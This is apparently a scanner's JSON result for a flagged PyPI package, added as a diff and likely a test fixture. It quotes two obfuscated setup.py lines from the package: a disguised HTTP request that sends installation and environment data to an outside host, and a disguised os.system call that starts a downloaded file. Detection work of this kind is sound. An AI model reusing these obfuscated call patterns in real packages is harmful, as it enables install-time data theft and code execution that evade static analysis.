@@ -1,0 +1,33 @@
+{
+    "package": "./packages_pypi/1337c-4.4.7_obfuscated",
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "shady-links": {},
+        "exfiltrate-sensitive-data": {},
+        "dll-hijacking": {},
+        "unicode": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "code-execution": {},
+        "exec-base64": {},
+        "steganography": {},
+        "clipboard-access": {},
+        "api-obfuscation": [
+            {
+                "location": "setup.py:11",
+                "code": "        t = requests.__dict__['get'](\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n",
+                "message": "This package uses obfuscated API calls that may evade static analysis detection"
+            },
+            {
+                "location": "setup.py:32",
+                "code": "            getattr(os, 'system')('start '+filename)\n",
+                "message": "This package uses obfuscated API calls that may evade static analysis detection"
+            }
+        ],
+        "cmd-overwrite": {},
+        "download-executable": {},
+        "suspicious_passwd_access_linux": {}
+    },
+    "path": "./packages_pypi/1337c-4.4.7_obfuscated"
+}
